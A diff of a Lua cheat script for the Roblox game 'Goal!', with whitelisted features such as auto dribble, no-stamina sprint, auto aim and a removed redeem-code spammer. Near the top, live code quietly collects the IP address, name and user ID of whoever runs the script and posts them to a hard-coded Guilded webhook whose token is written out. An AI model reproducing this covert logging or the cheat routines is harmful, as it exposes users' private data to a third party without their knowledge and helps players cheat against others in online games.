@@ -1,7 +1,3 @@
-if game:WaitForChild("CoreGui"):FindFirstChild("SDYASE123EN8FW") then
-	game.CoreGui.SDYASE123EN8FW:Destroy()
-end
-
 local UserIds = {
 	105115151, 2444381495, 
 	101361949,		-- Me!
@@ -17,40 +13,52 @@ local AutoAimWhitelist = {
 	105115151, 2444381495,	-- Me!
 	149522897,		--Booh #6532
 }
-local WebUrl = "https://media.guilded.gg/webhooks/d5b07cb7-b836-43c7-981f-8279bdf18f95/Qo6g2U1MMCQMuUaikMCUYM0eGkO8EG22WA6WOe0U4am8Ycs4CCasU4qQeAUIscyAkSE4sIaOeSssEqgoGEkGcG"
+
+local TrialMode = false
+local LogExecution = true
+
 
 local Player = game:GetService("Players").LocalPlayer
-local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 local whitelisted = false
 if table.find(UserIds, Player.UserId) then
 	whitelisted = true
 end
-local msg = {
-	["embeds"] = {{
-		["title"] = "**".. Player.Name .."**",
-		["color"] = 13708129,
-		["description"] = "IP: ".. ip .."\nWhitelisted: ".. (whitelisted and "Yes" or "No"),
-		["thumbnail"] = {
-			["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=".. Player.UserId .."&width=420&height=420&format=png",
-		},
-		["footer"] = {
-			["text"] = "Player ID: ".. Player.UserId,
-		},
-	}}
-}
 
-local response = syn.request(
-	{
-		Url = WebUrl,
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json"
-		},
-		Body = game:GetService("HttpService"):JSONEncode(msg)
+if LogExecution then
+	local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+	local WebUrl = "https://media.guilded.gg/webhooks/d5b07cb7-b836-43c7-981f-8279bdf18f95/Qo6g2U1MMCQMuUaikMCUYM0eGkO8EG22WA6WOe0U4am8Ycs4CCasU4qQeAUIscyAkSE4sIaOeSssEqgoGEkGcG"
+
+	local msg = {
+		["embeds"] = {{
+			["title"] = "**".. Player.Name .."**",
+			["color"] = 13708129,
+			["description"] = "IP: ".. ip .."\nWhitelisted: ".. (whitelisted and "Yes" or "No"),
+			["thumbnail"] = {
+				["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=".. Player.UserId .."&width=420&height=420&format=png",
+			},
+			["footer"] = {
+				["text"] = "Player ID: ".. Player.UserId,
+			},
+		}}
 	}
-)
 
-if whitelisted then
+	local response = syn.request(
+		{
+			Url = WebUrl,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = game:GetService("HttpService"):JSONEncode(msg)
+		}
+	)
+end
+
+if game:WaitForChild("CoreGui"):FindFirstChild("SDYASE123EN8FW") then
+	game.CoreGui.SDYASE123EN8FW:Destroy()
+end
+
+if whitelisted or TrialMode then
 	local ScreenGui = Instance.new("ScreenGui")
 	local ImageButton = Instance.new("ImageButton")
 	local Pages = Instance.new("Folder")
@@ -749,7 +757,19 @@ if whitelisted then
 		if Character:FindFirstChild("Radius") then Character.Radius:Destroy() end
 		if Character.HumanoidRootPart:FindFirstChild("Radius") then Character.HumanoidRootPart.Radius:Destroy() end
 	end)
+	
+	local function ToggleTransparency(Frame)
+		if Frame.Button.BackgroundTransparency == 0 then
 
+			Frame.Button.BackgroundTransparency = 1
+		else
+			Frame.Button.BackgroundTransparency = 0
+		end
+	end
+
+	local F = {}
+	local a = {}
+	local b = {}
 	if game.GameId == 3213718766 then -- Goal!
 		local SprintSpeed = 21
 		local StepTackleRadius = 12
@@ -758,16 +778,7 @@ if whitelisted then
 
 		local CanDribble = true
 		local AutoAim = {}
-		local F = {}
 
-		local function ToggleTransparency(Frame)
-			if Frame.Button.BackgroundTransparency == 0 then
-
-				Frame.Button.BackgroundTransparency = 1
-			else
-				Frame.Button.BackgroundTransparency = 0
-			end
-		end
 		local function ChangeBadge(Arch, Text)
 			Player[Arch].Value = Text
 		end
@@ -780,593 +791,657 @@ if whitelisted then
 			end
 		end
 
-		if game.PlaceId == 8397893574 then
-			local Customize_Tab = CreateTab(Column1_Game_, "Customize", {UDim2.new(1, 0, 0.074, 100), UDim2.new(0, 77, 0, 2)})
-
-			local Code_Spammer = ToggleTextBox(Customize_Tab, "Code Spammer", "Code")
-
-			local Code_Spammer_Function = function()
-				ToggleTransparency(Code_Spammer)
-				if Code_Spammer.Button.BackgroundTransparency == 0 then
-					local Event = game.Players.LocalPlayer.PlayerGui.Intro.Customize.CustomizationFrame.Codes.Redeem.LocalScript.RemoteEvent
-					local Text = Code_Spammer.TextFrame.TextBox.Text
-					local Runners = {
-						[1] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[2] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[3] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[4] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[5] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[6] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end),
-						[7] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end),
-						[8] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[9] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end),
-						[10] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[11] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[12] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[13] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[14] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[15] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[16] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[17] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[18] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[19] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[20] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[21] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[22] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[23] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[24] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[25] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end), 
-						[26] = game:GetService("RunService").RenderStepped:Connect(function() Event:FireServer(Text) end)}
-					wait(5)
-
-					for _, letter in pairs(Runners) do
-						letter:Disconnect()
-					end
-
-					Code_Spammer.Button.BackgroundTransparency = 1
-				end
-			end
-
-			Code_Spammer.Button.MouseButton1Click:Connect(Code_Spammer_Function)
-
-		elseif game.PlaceId == 9822821238 then
+		if game.PlaceId == 9822821238 then
 			local Events = game:GetService("ReplicatedStorage").Events
 			local Animations = game:GetService("ReplicatedStorage").Animations
 			
-			
-			local Info = {Column1_Game_, "Goal!", {UDim2.new(0.95, 0, 0, 126), UDim2.new(0, 39, 0, 2)}, UDim2.new(0, 8, 0, 0)} --+23
-			local Game_Tab = CreateTab(Info[1], Info[2], Info[3], Info[4])
-			local Game_Bind = CreateTab(Column1_Keybinds, Info[2], Info[3], Info[4])
-			local Info = {Column1_Game_, "Badges", {UDim2.new(0.95, 0, 0, 103), UDim2.new(0, 39, 0, 2)}, UDim2.new(0, 8, 0, 0)}
-			local Badge_Tab = CreateTab(Info[1], Info[2], Info[3], Info[4])
-			local Badge_Bind = CreateTab(Column1_Keybinds, Info[2], Info[3], Info[4])
-			local Info = {Column2_Game_, "Auto Dribble", {UDim2.new(0.95, 0, 0, 80), UDim2.new(0, 101, 0, 2)}, UDim2.new(0, 8, 0, 0)}
-			local AutoDribble_Tab = CreateTab(Info[1], Info[2], Info[3], Info[4])
-			local AutoDribble_Bind = CreateTab(Column2_Keybinds, Info[2], Info[3], Info[4])
-			local Info = {Column2_Game_, "Shooting", {UDim2.new(0.95, 0, 0, 60), UDim2.new(0, 58, 0, 2)}, UDim2.new(0, 8, 0, 0)}
-			local Shooting_Tab = CreateTab(Info[1], Info[2], Info[3], Info[4])
-			local Shooting_Bind = CreateTab(Column2_Keybinds, Info[2], Info[3], Info[4])
+			if TrialMode and not whitelisted then
+				local Info = {Column2_Game_, "Auto Dribble", {UDim2.new(0.95, 0, 0, 80), UDim2.new(0, 101, 0, 2)}, UDim2.new(0, 8, 0, 0)}
+				local AutoDribble_Tab = CreateTab(Info[1], Info[2], Info[3], Info[4])
+				local AutoDribble_Bind = CreateTab(Column2_Keybinds, Info[2], Info[3], Info[4])
+				
+				a.Auto_Dribble, b.Auto_Dribble_Bind = ToggleButton(AutoDribble_Tab, "Auto Dribble", AutoDribble_Bind)
+				a.Show_Step_Radius, b.Show_Step_Radius_Bind = ToggleButton(AutoDribble_Tab, "Show Step Radius", AutoDribble_Bind)
+				
+				local playerEnteredRadius = {}
+				local playersInRadius = {}
 
-			local a = {}
-			local b = {}
-			a.Quick_Queue, b.Quick_Queue_Bind = ToggleButton(Game_Tab, "Quick Queue", Game_Bind)
-			a.No_Stam_Sprint, b.No_Stam_Sprint_Bind = ToggleButton(Game_Tab, "No Stam Sprint", Game_Bind)
-			a.Unlock_Camera, b.Unlock_Camera_Bind = ToggleButton(Game_Tab, "Unlock Camera", Game_Bind)
-
-			a.Ball_Awareness, b.Ball_Awareness_Bind = ToggleButton(Badge_Tab, "Ball Awareness", Badge_Bind)
-			a.CarryBall, b.CarryBall_Bind = ToggleButton(Badge_Tab, "Carry Ball", Badge_Bind)
-			a.Center, b.Center_Bind = ToggleButton(Badge_Tab, "Center", Badge_Bind)
-			a.FormlessShooter, b.FormlessShooter_Bind = ToggleButton(Badge_Tab, "FormlessShooter", Badge_Bind)
-
-			a.Auto_Dribble, b.Auto_Dribble_Bind = ToggleButton(AutoDribble_Tab, "Auto Dribble", AutoDribble_Bind)
-			a.Jump_Input, b.Jump_Input_Bind = ToggleButton(AutoDribble_Tab, "Jump Input", AutoDribble_Bind)
-			a.Show_Step_Radius, b.Show_Step_Radius_Bind = ToggleButton(AutoDribble_Tab, "Show Step Radius", AutoDribble_Bind)
-
-			a.Max_Power, b.Max_Power_Bind = ToggleButton(Shooting_Tab, "Max Power", Shooting_Bind)
-			a.Auto_Aim, b.Auto_Aim_Bind = ToggleButton(Shooting_Tab, "Auto Aim", Shooting_Bind)
-			---------------------------------------------------------------------------
-			if not  table.find(AutoAimWhitelist, Player.UserId) then
-				a.Auto_Aim.Visible = false
-				b.Auto_Aim_Bind.Visible = false
-			end
-			---------------------------------------------------------------------------
-			local Actual_Spots = {}
-			for _, i in pairs(workspace:GetDescendants()) do
-				if i.Parent.Name == "BlueSpots" or i.Parent.Name == "RedSpots" and i:FindFirstChildOfClass("ProximityPrompt") then
-					table.insert(Actual_Spots, i)
+				local function onPlayerEnterRadius(otherPlayer)
+					table.insert(playersInRadius, otherPlayer)
 				end
-			end
-			local function FindSpot(Character)
-				local filter_table = {}
-
-				for _, i in pairs(workspace:GetDescendants()) do
-					if i.Parent.Name == "BlueSpots" or i.Parent.Name == "RedSpots" then
-						if i:IsA('Part') and i:FindFirstChildOfClass("ProximityPrompt") then
-							table.insert(filter_table, i)
+				local function onPlayerLeaveRadius(otherPlayer)
+					table.remove(playersInRadius, table.find(playersInRadius, otherPlayer))
+				end
+				local function checkRadius()
+					local playersInRadius = {}
+					for _, otherPlayer in pairs(game:GetService("Players"):GetPlayers()) do
+						if otherPlayer ~= Player and otherPlayer.Name ~= "Blu_Mo0n" then
+							local distance = (otherPlayer.Character.PrimaryPart.Position - Player.Character.PrimaryPart.Position).Magnitude
+							if distance <= SlideTackleRadius then
+								playersInRadius[otherPlayer] = true
+								if not playerEnteredRadius[otherPlayer] then
+									playerEnteredRadius[otherPlayer] = true
+									onPlayerEnterRadius(otherPlayer)
+								end
+							else
+								if playerEnteredRadius[otherPlayer] then
+									playerEnteredRadius[otherPlayer] = false
+									onPlayerLeaveRadius(otherPlayer)
+								end
+							end
 						end
 					end
 				end
-
-				local startPoint = Character.HumanoidRootPart.Position
-				local closestPart = nil
-				local minDistance = math.huge
-				for _, part in pairs(filter_table) do
-					local distance = (part.Position - startPoint).Magnitude
-					if distance < minDistance then
-						minDistance = distance
-						closestPart = part
-					end
-				end
-
-				return closestPart
-			end
-			F.Quick_Queue_Function = function()
-				ToggleTransparency(a.Quick_Queue)
-
-				local NearestSpot = FindSpot(Player.Character)
-				while a.Quick_Queue.Button.BackgroundTransparency == 0 and not Script_Disabled do
-					local Character = Player.Character
-					if NearestSpot.Parent.Parent["-Scoreboard"].Timer.Txt.Text == "300" and not Player.Character.VFX.IsPlaying.Value and not Player.Character.VFX.NoMove.Value and a.Quick_Queue.Button.BackgroundTransparency ~= 1 and not Script_Disabled then
-						fireproximityprompt(NearestSpot.ProximityPrompt, 1)
-						a.Quick_Queue.Button.BackgroundTransparency = 1
-					end
-					repeat task.wait() until NearestSpot.Parent.Parent["-Scoreboard"].Timer.Txt.Text == "300" or a.Quick_Queue.Button.BackgroundTransparency == 1 or Script_Disabled
-				end
-			end
-			---------------------------------------------------------------------------
-			local Toggle = false
-			local i = nil
-			F.No_Stam_Sprint_Function = function(MouseLock)
-				ToggleTransparency(a.No_Stam_Sprint)
-				local function CheckMouseLock()
-					if MouseLock then
-						if UserInput.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
+				local function FindTackleFootAnimation(Op, ID)
+					for i, Track in pairs (Op.Humanoid.Animator:GetPlayingAnimationTracks()) do
+						if Track.Animation.AnimationId == ID then
 							return true
+						end
+					end
+				end
+				F.Auto_Dribble_Function = function()
+					ToggleTransparency(a.Auto_Dribble)
+					if a.Auto_Dribble.Button.BackgroundTransparency == 0 then
+						local RenderStepped = runService.RenderStepped:Connect(checkRadius)
+
+						local Dribble_Loop 
+						Dribble_Loop = runService.RenderStepped:Connect(function()
+							local Character = Player.Character
+							if Character:FindFirstChild("Bola") and not inAir(Character) and not Character:FindFirstChild("IsDribbling") and Character.Humanoid.AutoRotate == true then
+								local Ball = Player.Character.Bola
+								for _, Op in ipairs(playersInRadius) do
+									local op = Op.Character
+									if op.Humanoid.Teammate.Value ~= Character.Humanoid.Teammate.Value and not Ball:FindFirstChild(op.Name) then
+										if op.Humanoid:FindFirstChild("Tackled") or FindTackleFootAnimation(op, "rbxassetid://9015340307") and (op.HumanoidRootPart.Position - Character.HumanoidRootPart.Position).Magnitude < StepTackleRadius then
+											if Character.Backpack.DribbleCounter.Value >= 1 and not UserInput:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and not inAir(Character) and CanDribble and not Character:FindFirstChild("IsDribbling") and not Character.Humanoid:FindFirstChild("Tackled") and Character.Humanoid.AutoRotate == true then
+												Events.RealisticMovement:FireServer(game:GetService("Players").LocalPlayer, "V", true)
+
+												local CD = 1.5
+												if op.Humanoid:FindFirstChild("Tackled") then
+													CD = 3
+												end
+												local Tag = Instance.new("NumberValue")
+												Tag.Name = op.Name
+												Tag.Parent = Ball
+												Debris:AddItem(Tag, CD)
+											end
+										end
+									end
+								end
+							end
+							if a.Auto_Dribble.Button.BackgroundTransparency == 1 or Script_Disabled then
+								Dribble_Loop:Disconnect()
+								RenderStepped:Disconnect()
+								playerEnteredRadius = {}
+								playersInRadius = {}
+							end
+						end)
+					end
+				end
+				---------------------------------------------------------------------------
+				F.Show_Step_Radius_Function = function()
+					ToggleTransparency(a.Show_Step_Radius)
+					local Character = Player.Character
+					if a.Show_Step_Radius.Button.BackgroundTransparency == 0 then
+						local Cylinder, Weld = Instance.new('Part', Character), Instance.new('Weld', Character.HumanoidRootPart)
+						Cylinder.Name = "Radius"
+						Cylinder.Shape = Enum.PartType.Cylinder
+						Cylinder.Size = Vector3.new(0.1, StepTackleRadius, StepTackleRadius)
+						Cylinder.Anchored = false
+						Cylinder.CanCollide = false
+						Cylinder.Massless = true
+						Cylinder.Transparency = 0.7
+						Weld.Name = "Radius"
+						Weld.Part0 = Weld.Parent
+						Weld.Part1 = Cylinder
+						Weld.C0 = CFrame.new(0, -3, 0, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1)
+						while a.Show_Step_Radius.Button.BackgroundTransparency == 0 do
+							local Character = Player.Character
+							Cylinder.Parent = Character
+							Cylinder.Size = Vector3.new(0.1, StepTackleRadius, StepTackleRadius)
+							Weld.Parent = Character.HumanoidRootPart
+							Weld.Part0 = Weld.Parent
+
+							Player.CharacterAppearanceLoaded:Wait()
+						end
+					else
+						if Character:FindFirstChild("Radius") then Character.Radius:Destroy() end
+						if Character.HumanoidRootPart:FindFirstChild("Radius") then Character.HumanoidRootPart.Radius:Destroy() end
+					end
+				end
+			elseif whitelisted then
+				local Info = {Column1_Game_, "Goal!", {UDim2.new(0.95, 0, 0, 126), UDim2.new(0, 39, 0, 2)}, UDim2.new(0, 8, 0, 0)} --+23
+				local Game_Tab = CreateTab(Info[1], Info[2], Info[3], Info[4])
+				local Game_Bind = CreateTab(Column1_Keybinds, Info[2], Info[3], Info[4])
+				local Info = {Column1_Game_, "Badges", {UDim2.new(0.95, 0, 0, 103), UDim2.new(0, 39, 0, 2)}, UDim2.new(0, 8, 0, 0)}
+				local Badge_Tab = CreateTab(Info[1], Info[2], Info[3], Info[4])
+				local Badge_Bind = CreateTab(Column1_Keybinds, Info[2], Info[3], Info[4])
+				local Info = {Column2_Game_, "Auto Dribble", {UDim2.new(0.95, 0, 0, 80), UDim2.new(0, 101, 0, 2)}, UDim2.new(0, 8, 0, 0)}
+				local AutoDribble_Tab = CreateTab(Info[1], Info[2], Info[3], Info[4])
+				local AutoDribble_Bind = CreateTab(Column2_Keybinds, Info[2], Info[3], Info[4])
+				local Info = {Column2_Game_, "Shooting", {UDim2.new(0.95, 0, 0, 60), UDim2.new(0, 58, 0, 2)}, UDim2.new(0, 8, 0, 0)}
+				local Shooting_Tab = CreateTab(Info[1], Info[2], Info[3], Info[4])
+				local Shooting_Bind = CreateTab(Column2_Keybinds, Info[2], Info[3], Info[4])
+
+				a.Quick_Queue, b.Quick_Queue_Bind = ToggleButton(Game_Tab, "Quick Queue", Game_Bind)
+				a.No_Stam_Sprint, b.No_Stam_Sprint_Bind = ToggleButton(Game_Tab, "No Stam Sprint", Game_Bind)
+				a.Unlock_Camera, b.Unlock_Camera_Bind = ToggleButton(Game_Tab, "Unlock Camera", Game_Bind)
+
+				a.Ball_Awareness, b.Ball_Awareness_Bind = ToggleButton(Badge_Tab, "Ball Awareness", Badge_Bind)
+				a.CarryBall, b.CarryBall_Bind = ToggleButton(Badge_Tab, "Carry Ball", Badge_Bind)
+				a.Center, b.Center_Bind = ToggleButton(Badge_Tab, "Center", Badge_Bind)
+				a.FormlessShooter, b.FormlessShooter_Bind = ToggleButton(Badge_Tab, "FormlessShooter", Badge_Bind)
+
+				a.Auto_Dribble, b.Auto_Dribble_Bind = ToggleButton(AutoDribble_Tab, "Auto Dribble", AutoDribble_Bind)
+				a.Jump_Input, b.Jump_Input_Bind = ToggleButton(AutoDribble_Tab, "Jump Input", AutoDribble_Bind)
+				a.Show_Step_Radius, b.Show_Step_Radius_Bind = ToggleButton(AutoDribble_Tab, "Show Step Radius", AutoDribble_Bind)
+
+				a.Max_Power, b.Max_Power_Bind = ToggleButton(Shooting_Tab, "Max Power", Shooting_Bind)
+				a.Auto_Aim, b.Auto_Aim_Bind = ToggleButton(Shooting_Tab, "Auto Aim", Shooting_Bind)
+				---------------------------------------------------------------------------
+				if not  table.find(AutoAimWhitelist, Player.UserId) then
+					a.Auto_Aim.Visible = false
+					b.Auto_Aim_Bind.Visible = false
+				end
+				---------------------------------------------------------------------------
+				local Actual_Spots = {}
+				for _, i in pairs(workspace:GetDescendants()) do
+					if i.Parent.Name == "BlueSpots" or i.Parent.Name == "RedSpots" and i:FindFirstChildOfClass("ProximityPrompt") then
+						table.insert(Actual_Spots, i)
+					end
+				end
+				local function FindSpot(Character)
+					local filter_table = {}
+
+					for _, i in pairs(workspace:GetDescendants()) do
+						if i.Parent.Name == "BlueSpots" or i.Parent.Name == "RedSpots" then
+							if i:IsA('Part') and i:FindFirstChildOfClass("ProximityPrompt") then
+								table.insert(filter_table, i)
+							end
+						end
+					end
+
+					local startPoint = Character.HumanoidRootPart.Position
+					local closestPart = nil
+					local minDistance = math.huge
+					for _, part in pairs(filter_table) do
+						local distance = (part.Position - startPoint).Magnitude
+						if distance < minDistance then
+							minDistance = distance
+							closestPart = part
+						end
+					end
+
+					return closestPart
+				end
+				F.Quick_Queue_Function = function()
+					ToggleTransparency(a.Quick_Queue)
+
+					local NearestSpot = FindSpot(Player.Character)
+					while a.Quick_Queue.Button.BackgroundTransparency == 0 and not Script_Disabled do
+						local Character = Player.Character
+						if NearestSpot.Parent.Parent["-Scoreboard"].Timer.Txt.Text == "300" and not Player.Character.VFX.IsPlaying.Value and not Player.Character.VFX.NoMove.Value and a.Quick_Queue.Button.BackgroundTransparency ~= 1 and not Script_Disabled then
+							fireproximityprompt(NearestSpot.ProximityPrompt, 1)
+							a.Quick_Queue.Button.BackgroundTransparency = 1
+						end
+						repeat task.wait() until NearestSpot.Parent.Parent["-Scoreboard"].Timer.Txt.Text == "300" or a.Quick_Queue.Button.BackgroundTransparency == 1 or Script_Disabled
+					end
+				end
+				---------------------------------------------------------------------------
+				local Toggle = false
+				local i = nil
+				F.No_Stam_Sprint_Function = function(MouseLock)
+					ToggleTransparency(a.No_Stam_Sprint)
+					local function CheckMouseLock()
+						if MouseLock then
+							if UserInput.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
+								return true
+							else
+								return false
+							end
 						else
 							return false
 						end
-					else
-						return false
 					end
-				end
-				local Humanoid = Player.Character:WaitForChild("Humanoid")
-				if not Script_Disabled and a.No_Stam_Sprint.Button.BackgroundTransparency == 0 and not Player.Character.Humanoid:FindFirstChild("Tackled") then
-					if Toggle then
-						Humanoid.WalkSpeed = 16
-					else
-						local Check = false
-						if UserInput:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Player.Character:FindFirstChild("Bola") then
-							Check = true
-						end
-						if not Check or a.CarryBall.Button.BackgroundTransparency == 0 then
-							Toggle = true
-							i = Instance.new("StringValue")
-							i.Name = "ShiftLock"
-							i.Parent = Humanoid
-							wait()
-							Humanoid.WalkSpeed = SprintSpeed
-							while Toggle do
-								repeat wait() until Humanoid.WalkSpeed ~= SprintSpeed or a.No_Stam_Sprint.Button.BackgroundTransparency ~= 0 or Script_Disabled or UserInput:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Player.Character:FindFirstChild("Bola") and not CarryBallActive or CheckMouseLock()
-								if Toggle then
-									a.No_Stam_Sprint.Button.BackgroundTransparency = 1
-									Toggle = false
-									i:Destroy()
-									if Humanoid.WalkSpeed == SprintSpeed then
-										Humanoid.WalkSpeed = 16
-									end
-								end
-							end
-						end
-					end
-				end
-			end
-			---------------------------------------------------------------------------
-			F.Unlock_Camera_Function = function()
-				ToggleTransparency(a.Unlock_Camera)
-
-				if a.Unlock_Camera.Button.BackgroundTransparency == 0 then
-					Player.CameraMaxZoomDistance = 100
-					repeat wait() until Script_Disabled or a.Unlock_Camera.Button.BackgroundTransparency == 1
-					Player.CameraMaxZoomDistance = 23
-				end
-			end
-			---------------------------------------------------------------------------
-			local R = nil
-			F.Center_Function = function()
-				ToggleTransparency(a.Center)
-
-				if a.Center.Button.BackgroundTransparency == 0 then
-					R = runService.RenderStepped:Connect(function() ChangeBadge("ArcheType3", "Center") end)
-					CarryBallActive = false
-					repeat wait() until Script_Disabled or a.Center.Button.BackgroundTransparency == 1
-					R:Disconnect()
-				end
-			end
-			---------------------------------------------------------------------------
-			F.Ball_Awareness_Function = function()
-				ToggleTransparency(a.Ball_Awareness)
-			end
-			if workspace:FindFirstChild("Ignore") then
-				workspace.Ignore.Predict.ChildAdded:Connect(function(p8)
-					if a.Ball_Awareness.Button.BackgroundTransparency == 0 and not Script_Disabled then
-						p8.Transparency = 0.6
-					end
-				end)
-			end
-			---------------------------------------------------------------------------
-			F.CarryBall_Function = function()
-				ToggleTransparency(a.CarryBall)
-			end
-			---------------------------------------------------------------------------
-			local R = {}
-			local OriginalImage = nil
-			F.FormlessShooter_Function = function()
-				ToggleTransparency(a.FormlessShooter)
-				if a.FormlessShooter.Button.BackgroundTransparency == 0 then
-					OriginalImage = Player.PlayerGui.Layout.Badges.Slot1.Image
-					Player.PlayerGui.Layout.Badges.Slot1.Image = "rbxassetid://10323892082"
-					repeat wait() until Script_Disabled or a.FormlessShooter.Button.BackgroundTransparency == 1
-					Player.PlayerGui.Layout.Badges.Slot1.Image = OriginalImage
-				end
-			end
-			---------------------------------------------------------------------------
-			local playerEnteredRadius = {}
-			local playersInRadius = {}
-
-			local function onPlayerEnterRadius(otherPlayer)
-				table.insert(playersInRadius, otherPlayer)
-			end
-			local function onPlayerLeaveRadius(otherPlayer)
-				table.remove(playersInRadius, table.find(playersInRadius, otherPlayer))
-			end
-			local function checkRadius()
-				local playersInRadius = {}
-				for _, otherPlayer in pairs(game:GetService("Players"):GetPlayers()) do
-					if otherPlayer ~= Player and otherPlayer.Name ~= "Blu_Mo0n" then
-						local distance = (otherPlayer.Character.PrimaryPart.Position - Player.Character.PrimaryPart.Position).Magnitude
-						if distance <= SlideTackleRadius then
-							playersInRadius[otherPlayer] = true
-							if not playerEnteredRadius[otherPlayer] then
-								playerEnteredRadius[otherPlayer] = true
-								onPlayerEnterRadius(otherPlayer)
-							end
+					local Humanoid = Player.Character:WaitForChild("Humanoid")
+					if not Script_Disabled and a.No_Stam_Sprint.Button.BackgroundTransparency == 0 and not Player.Character.Humanoid:FindFirstChild("Tackled") then
+						if Toggle then
+							Humanoid.WalkSpeed = 16
 						else
-							if playerEnteredRadius[otherPlayer] then
-								playerEnteredRadius[otherPlayer] = false
-								onPlayerLeaveRadius(otherPlayer)
+							local Check = false
+							if UserInput:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Player.Character:FindFirstChild("Bola") then
+								Check = true
 							end
-						end
-					end
-				end
-			end
-			local function FindTackleFootAnimation(Op, ID)
-				for i, Track in pairs (Op.Humanoid.Animator:GetPlayingAnimationTracks()) do
-					if Track.Animation.AnimationId == ID then
-						return true
-					end
-				end
-			end
-			F.Auto_Dribble_Function = function()
-				ToggleTransparency(a.Auto_Dribble)
-				if a.Auto_Dribble.Button.BackgroundTransparency == 0 then
-					local RenderStepped = runService.RenderStepped:Connect(checkRadius)
-
-					local Dribble_Loop 
-					Dribble_Loop = runService.RenderStepped:Connect(function()
-						local Character = Player.Character
-						if Character:FindFirstChild("Bola") and not inAir(Character) and not Character:FindFirstChild("IsDribbling") and Character.Humanoid.AutoRotate == true then
-							local Ball = Player.Character.Bola
-							for _, Op in ipairs(playersInRadius) do
-								local op = Op.Character
-								if op.Humanoid.Teammate.Value ~= Character.Humanoid.Teammate.Value and not Ball:FindFirstChild(op.Name) then
-									if op.Humanoid:FindFirstChild("Tackled") or FindTackleFootAnimation(op, "rbxassetid://9015340307") and (op.HumanoidRootPart.Position - Character.HumanoidRootPart.Position).Magnitude < StepTackleRadius then
-										if Character.Backpack.DribbleCounter.Value >= 1 and not UserInput:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and not inAir(Character) and CanDribble and not Character:FindFirstChild("IsDribbling") and not Character.Humanoid:FindFirstChild("Tackled") and Character.Humanoid.AutoRotate == true then
-											Events.RealisticMovement:FireServer(game:GetService("Players").LocalPlayer, "V", true)
-
-											local CD = 1.5
-											if op.Humanoid:FindFirstChild("Tackled") then
-												CD = 3
-											end
-											local Tag = Instance.new("NumberValue")
-											Tag.Name = op.Name
-											Tag.Parent = Ball
-											Debris:AddItem(Tag, CD)
+							if not Check or a.CarryBall.Button.BackgroundTransparency == 0 then
+								Toggle = true
+								i = Instance.new("StringValue")
+								i.Name = "ShiftLock"
+								i.Parent = Humanoid
+								wait()
+								Humanoid.WalkSpeed = SprintSpeed
+								while Toggle do
+									repeat wait() until Humanoid.WalkSpeed ~= SprintSpeed or a.No_Stam_Sprint.Button.BackgroundTransparency ~= 0 or Script_Disabled or UserInput:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Player.Character:FindFirstChild("Bola") and not CarryBallActive or CheckMouseLock()
+									if Toggle then
+										a.No_Stam_Sprint.Button.BackgroundTransparency = 1
+										Toggle = false
+										i:Destroy()
+										if Humanoid.WalkSpeed == SprintSpeed then
+											Humanoid.WalkSpeed = 16
 										end
 									end
 								end
 							end
 						end
-						if a.Auto_Dribble.Button.BackgroundTransparency == 1 or Script_Disabled then
-							Dribble_Loop:Disconnect()
-							RenderStepped:Disconnect()
-							playerEnteredRadius = {}
-							playersInRadius = {}
+					end
+				end
+				---------------------------------------------------------------------------
+				F.Unlock_Camera_Function = function()
+					ToggleTransparency(a.Unlock_Camera)
+
+					if a.Unlock_Camera.Button.BackgroundTransparency == 0 then
+						Player.CameraMaxZoomDistance = 100
+						repeat wait() until Script_Disabled or a.Unlock_Camera.Button.BackgroundTransparency == 1
+						Player.CameraMaxZoomDistance = 23
+					end
+				end
+				---------------------------------------------------------------------------
+				local R = nil
+				F.Center_Function = function()
+					ToggleTransparency(a.Center)
+
+					if a.Center.Button.BackgroundTransparency == 0 then
+						R = runService.RenderStepped:Connect(function() ChangeBadge("ArcheType3", "Center") end)
+						CarryBallActive = false
